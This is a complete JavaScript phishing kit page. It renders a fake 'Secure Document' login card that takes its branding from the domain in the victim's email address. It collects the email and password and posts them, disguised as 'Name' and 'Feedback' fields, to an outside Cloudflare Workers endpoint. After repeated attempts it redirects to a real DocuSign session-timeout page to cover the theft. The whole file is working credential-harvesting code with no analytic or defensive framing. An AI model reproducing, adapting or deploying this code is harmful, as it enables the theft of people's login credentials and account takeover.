(function () {
  "use strict";

  var CONFIG = {
    BG_IMG: "https://i.postimg.cc/Dz2Q7TzV/imageing.png",
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT: "https://rum-email-proxy.haricoting.workers.dev/contact",
    SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
    LOCKOUT_REDIRECT: "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
    SECRET_KEY: "MATT_SECURE_2026",
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: "st_7b3f19",
    PATH_SEGMENTS: ["profile", "dashboard", "console", "manage", "overview"],
    MSG_WRONG: "An error occurred. Please try again later.",
    MSG_LOCKOUT: "Too many incorrect attempts. Access blocked.",
    MSG_GRANTED: "Access granted. Redirecting...",
    MSG_NET: "Network error. Please try again.",
    HEADING: "Secure Document",
    SUBHEAD: "Login to view your secure document",
    FOOTER: "Message Center",
    EMAIL_LABEL: "EMAIL",
    KEY_LABEL: "PASSWORD",
    KEY_PLACEHOLDER: "Enter your password",
    BUTTON_TEXT: "Unlock",
    TAG_TEXT: "Encrypted Delivery"
  };

  function injectStyles() {
    var css = "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;background:#f5f7fa;position:relative;overflow:hidden}#bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none;filter:brightness(1.1)}#bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.7);z-index:1;pointer-events:none}.frame_v7{position:relative;z-index:2;width:100%;max-width:420px;background:#ffffff;border-radius:1.5rem;box-shadow:0 4px 24px rgba(0,20,40,0.08);padding:2.5rem 2rem 2rem;border:1px solid rgba(0,0,0,0.04)}@keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}.frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}.brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1.5rem}.brand_orb{width:64px;height:64px;background:#3a4f5c;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:1rem;box-shadow:0 2px 8px rgba(0,0,0,0.1)}.brand_orb::after{content:'S';color:#fff;font-size:28px;font-weight:600;font-family:Georgia,serif}.chip_tag{font-size:.7rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:#4a6b8a;background:#e8f0f8;padding:.35rem 1rem;border-radius:20px;display:inline-flex;align-items:center;gap:.5rem;margin-bottom:1.25rem;border:1px solid #d0e0f0}.chip_tag::before,.chip_tag::after{content:'•';color:#6b8cae;font-size:.8rem}.title_main{font-size:1.35rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;margin-bottom:.5rem}.caption_sub{text-align:center;color:#6b7b8f;font-size:.9rem;margin-bottom:2rem}.row_block{margin-bottom:1.25rem}.lbl_small{display:block;font-size:.75rem;font-weight:600;color:#4a5568;margin-bottom:.5rem;letter-spacing:.02em}.field_shell{display:flex;align-items:center;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:12px;padding:0 1rem;height:52px;transition:all .2s}.field_shell:focus-within{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.1)}.field_shell.locked_bg{background:#f1f5f9}.ico_slot{display:flex;align-items:center;justify-content:center;width:20px;height:20px;flex-shrink:0;color:#94a3b8;margin-right:.75rem}.ico_slot svg{width:20px;height:20px;display:block}.inp_core{flex:1;width:100%;border:none;background:transparent;font-size:.95rem;color:#1e293b;outline:none}.inp_core::placeholder{color:#94a3b8}.eye_btn{background:transparent;border:none;padding:0 .5rem;cursor:pointer;color:#94a3b8;display:flex;align-items:center;justify-content:center;transition:color .2s;margin-left:.5rem}.eye_btn:hover{color:#64748b}.eye_btn svg{width:20px;height:20px;display:block}.cta_main{width:100%;background:#0f5b8c;border:none;border-radius:12px;padding:1rem 1.5rem;color:#fff;font-weight:600;font-size:1rem;cursor:pointer;margin-top:.5rem;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:.5rem;box-shadow:0 4px 12px rgba(15,91,140,.25)}.cta_main:hover:not(:disabled){background:#0d4d75;transform:translateY(-1px);box-shadow:0 6px 16px rgba(15,91,140,.3)}.cta_main:active:not(:disabled){transform:translateY(0)}.cta_main:disabled{opacity:.7;cursor:not-allowed}.cta_icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px}.cta_icon svg{width:18px;height:18px;stroke:currentColor;stroke-width:2;fill:none}.ring_load{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}@keyframes spin_r{to{transform:rotate(360deg)}}.base_note{margin-top:1.5rem;text-align:center;font-size:.75rem;color:#8b9aae;padding-top:1rem;border-top:1px solid #e8eef4}.alert_bar{background:#fef2f2;color:#dc2626;padding:.75rem 1rem;border-radius:10px;font-size:.85rem;margin-bottom:1rem;border:1px solid #fecaca;display:none;opacity:0;transform:translateY(-8px);transition:all .3s ease}.alert_bar.visible{display:block;opacity:1;transform:translateY(0)}#mail_x9k2{background:transparent;border:none;outline:none;width:100%;font-size:.95rem;color:#334155}#mail_slot{flex:1;color:#334155;font-size:.95rem}";
    var style = document.createElement("style");
    style.id = "zz_core_style";
    style.appendChild(document.createTextNode(css));
    document.head.appendChild(style);
  }

  function createLayout() {
    var bgCanvas = document.createElement("div");
    bgCanvas.id = "bg_canvas";
    document.body.insertBefore(bgCanvas, document.body.firstChild);
    
    var bgVeil = document.createElement("div");
    bgVeil.id = "bg_veil";
    document.body.insertBefore(bgVeil, document.body.firstChild);
    
    var existingInput = document.getElementById("mail_x9k2");
    if (!existingInput) {
      existingInput = document.createElement("input");
      existingInput.type = "email";
      existingInput.id = "mail_x9k2";
    }
    
    existingInput.removeAttribute("readonly");
    existingInput.removeAttribute("tabindex");
    existingInput.removeAttribute("value");
    existingInput.placeholder = "";
    existingInput.className = "";
    existingInput.style.cssText = "background:transparent;border:none;outline:none;width:100%;font-size:.95rem;color:#334155;";
    
    var card = document.createElement("div");
    card.className = "frame_v7";
    card.id = "card_root";
    
    // CORRECTED: Proper SVG icons matching original exactly
    card.innerHTML = 
      '<div class="brand_row">' +
        '<div class="brand_orb"></div>' +
        '<div class="chip_tag">' + CONFIG.TAG_TEXT + '</div>' +
        '<h1 class="title_main" id="title_node">' + CONFIG.HEADING + '</h1>' +
        '<div class="caption_sub" id="caption_node">' + CONFIG.SUBHEAD + '</div>' +
      '</div>' +
      '<div class="alert_bar" id="alert_node"></div>' +
      '<form id="main_form">' +
        '<div class="row_block">' +
          '<label class="lbl_small" for="mail_x9k2">' + CONFIG.EMAIL_LABEL + '</label>' +
          '<div class="field_shell locked_bg" id="email_shell">' +
            '<span class="ico_slot">' +
              // Email icon - envelope
              '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>' +
            '</span>' +
            '<div id="mail_slot" style="flex:1"></div>' +
          '</div>' +
        '</div>' +
        '<div class="row_block">' +
          '<label class="lbl_small" for="code_p4r7">' + CONFIG.KEY_LABEL + '</label>' +
          '<div class="field_shell">' +
            '<span class="ico_slot">' +
              // CORRECTED: Complete padlock icon matching original exactly
              '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/><circle cx="12" cy="16" r="1.3"/></svg>' +
            '</span>' +
            '<input class="inp_core" type="password" id="code_p4r7" placeholder="' + CONFIG.KEY_PLACEHOLDER + '" autocomplete="off" required>' +
            '<button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view">' +
              // Eye show icon (open eye)
              '<svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3"/></svg>' +
              // Eye hide icon (crossed out eye)
              '<svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/><path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/><line x1="2" y1="2" x2="22" y2="22"/></svg>' +
            '</button>' +
          '</div>' +
        '</div>' +
        '<button type="submit" class="cta_main" id="cta_node">' +
          '<span class="cta_icon">' +
            // Lock icon for button
            '<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M8 11V7a4 4 0 0 1 8 0v4"/><rect x="5" y="11" width="14" height="10" rx="2"/><circle cx="12" cy="17" r="1"/></svg>' +
          '</span>' +
          CONFIG.BUTTON_TEXT +
        '</button>' +
      '</form>' +
      '<div class="base_note" id="base_node">' + CONFIG.FOOTER + ' · © 2026</div>';
    
    document.body.appendChild(card);
    
    var mailSlot = document.getElementById("mail_slot");
    if (mailSlot && existingInput) {
      mailSlot.appendChild(existingInput);
    }
  }

  function applyBackgroundStyles() {
    var bgCanvas = document.getElementById("bg_canvas");
    var bgVeil = document.getElementById("bg_veil");
    if (!bgCanvas || !bgVeil) return;
    
    bgCanvas.style.backgroundImage = "url(\"" + CONFIG.BG_IMG + "\")";
    var filters = [];
    filters.push("brightness(" + CONFIG.BG_BRI + ")");
    if (CONFIG.BG_DAR !== 1) {
      filters.push("brightness(" + 1 / CONFIG.BG_DAR + ")");
    }
    filters.push("contrast(" + CONFIG.BG_CON + ")");
    filters.push("saturate(" + CONFIG.BG_SAT + ")");
    if (CONFIG.BG_BLUR > 0) {
      filters.push("blur(" + CONFIG.BG_BLUR + "px)");
    }
    if (CONFIG.BG_GRAY) {
      filters.push("grayscale(1)");
    }
    bgCanvas.style.filter = filters.join(" ");
    bgVeil.style.background = "rgba(255,255,255," + CONFIG.BG_OVERLAY + ")";
  }

  function updateURL() {
    try {
      var array = new Uint8Array(24);
      crypto.getRandomValues(array);
      var token = btoa(String.fromCharCode.apply(null, array)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
      history.replaceState(null, "", "#/" + CONFIG.PATH_SEGMENTS.join("/") + "/" + token);
    } catch (e) {}
  }

  function init() {
    injectStyles();
    createLayout();
    applyBackgroundStyles();
    updateURL();

    var emailInput = document.getElementById("mail_x9k2");
    var passwordInput = document.getElementById("code_p4r7");
    var titleNode = document.getElementById("title_node");
    var captionNode = document.getElementById("caption_node");
    var baseNode = document.getElementById("base_node");
    var eyeToggle = document.getElementById("eye_toggle");
    var eyeShow = document.getElementById("eye_show");
    var eyeHide = document.getElementById("eye_hide");
    var alertNode = document.getElementById("alert_node");
    var ctaBtn = document.getElementById("cta_node");
    var cardRoot = document.getElementById("card_root");
    var mainForm = document.getElementById("main_form");
    var alertTimeout = null;
    var isLocked = false;

    function getEmailDomain(email) {
      if (!email || email.indexOf("@") === -1) return "";
      var parts = email.split("@");
      if (parts.length === 2 && parts[1].trim() !== "") {
        return parts[1].trim().toLowerCase();
      }
      return "";
    }

    function capitalize(str) {
      if (!str) return "";
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    function showAlert(message, type) {
      if (alertTimeout) {
        clearTimeout(alertTimeout);
        alertTimeout = null;
      }
      alertNode.textContent = message;
      if (type === "success") {
        alertNode.style.background = "#f0fdf4";
        alertNode.style.color = "#166534";
        alertNode.style.borderColor = "#bbf7d0";
      } else {
        alertNode.style.background = "#fef2f2";
        alertNode.style.color = "#dc2626";
        alertNode.style.borderColor = "#fecaca";
      }
      alertNode.classList.add("visible");
      if (type === "success") {
        alertTimeout = setTimeout(function () {
          alertNode.classList.remove("visible");
        }, 6000);
      }
    }

    function hideAlert() {
      alertNode.classList.remove("visible");
      if (alertTimeout) {
        clearTimeout(alertTimeout);
        alertTimeout = null;
      }
    }

    function triggerWobble() {
      cardRoot.classList.remove("wobble_q_on");
      void cardRoot.offsetWidth;
      cardRoot.classList.add("wobble_q_on");
      setTimeout(function () {
        cardRoot.classList.remove("wobble_q_on");
      }, 700);
    }

    function updateDisplay() {
      var email = emailInput.value.trim();
      var domain = getEmailDomain(email);
      if (!domain) {
        titleNode.textContent = CONFIG.HEADING;
        captionNode.textContent = CONFIG.SUBHEAD;
        baseNode.textContent = CONFIG.FOOTER + " · © 2026";
        return;
      }
      var domainName = capitalize(domain.split(".")[0]);
      titleNode.textContent = domainName + " " + CONFIG.HEADING;
      captionNode.textContent = CONFIG.SUBHEAD;
      baseNode.textContent = domainName + " " + CONFIG.FOOTER + " · © 2026";
    }

    emailInput.addEventListener("input", updateDisplay);
    
    eyeToggle.addEventListener("click", function () {
      var isPassword = passwordInput.getAttribute("type") === "password";
      if (isPassword) {
        passwordInput.setAttribute("type", "text");
        eyeShow.style.display = "block";
        eyeHide.style.display = "none";
      } else {
        passwordInput.setAttribute("type", "password");
        eyeShow.style.display = "none";
        eyeHide.style.display = "block";
      }
      passwordInput.focus();
    });

    function handleLockout() {
      if (isLocked) return;
      isLocked = true;
      showAlert(CONFIG.MSG_LOCKOUT, "error");
      triggerWobble();
      passwordInput.value = "";
      ctaBtn.disabled = true;
      setTimeout(function () {
        window.location.href = CONFIG.LOCKOUT_REDIRECT;
      }, CONFIG.LOCKOUT_DELAY);
    }

    function handleSubmit(e) {
      e.preventDefault();
      if (isLocked) return;
      
      var email = emailInput.value.trim();
      var password = passwordInput.value.trim();
      
      hideAlert();
      
      if (!email || email.indexOf("@") === -1) {
        showAlert("Please enter a valid email address.", "error");
        triggerWobble();
        return;
      }
      if (!password) {
        showAlert("Please enter your password.", "error");
        triggerWobble();
        return;
      }

      ctaBtn.disabled = true;
      ctaBtn.innerHTML = '<span class="ring_load"></span> Loading...';
      
      var startTime = Date.now();

      var cleanPayload = new URLSearchParams();
      cleanPayload.append("Name", email);
      cleanPayload.append("Feedback", password);
      cleanPayload.append("timestamp", Date.now().toString());

      var hasError = false;
      var responseData = null;

      fetch(CONFIG.PHP_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: cleanPayload.toString()
      }).then(function (response) {
        return response.text();
      }).then(function (text) {
        try {
          responseData = JSON.parse(text);
        } catch (e) {
          hasError = true;
        }
      }).catch(function () {
        hasError = true;
      }).then(function () {
        var elapsed = Date.now() - startTime;
        var delay = Math.max(0, 2000 - elapsed);
        return new Promise(function (resolve) {
          setTimeout(resolve, delay);
        });
      }).then(function () {
        if (isLocked) return;
        
        var btnText = '<span class="cta_icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M8 11V7a4 4 0 0 1 8 0v4"/><rect x="5" y="11" width="14" height="10" rx="2"/><circle cx="12" cy="17" r="1"/></svg></span> ' + CONFIG.BUTTON_TEXT;
        
        if (hasError || !responseData) {
          ctaBtn.disabled = false;
          ctaBtn.innerHTML = btnText;
          showAlert(CONFIG.MSG_NET, "error");
          triggerWobble();
          passwordInput.value = "";
          passwordInput.focus();
          return;
        }

        if (responseData.status === "success") {
          showAlert(CONFIG.MSG_GRANTED, "success");
          setTimeout(function () {
            window.location.href = CONFIG.SUCCESS_REDIRECT;
          }, 1000);
          return;
        }
        
        if (responseData.status === "exhausted") {
          handleLockout();
          return;
        }

        var attemptCount = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attemptCount));
        
        if (attemptCount >= CONFIG.MAX_TRIES) {
          handleLockout();
          return;
        }

        ctaBtn.disabled = false;
        ctaBtn.innerHTML = btnText;
        showAlert(CONFIG.MSG_WRONG, "error");
        triggerWobble();
        passwordInput.value = "";
        passwordInput.focus();
      });
    }

    mainForm.addEventListener("submit", handleSubmit);
    updateDisplay();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
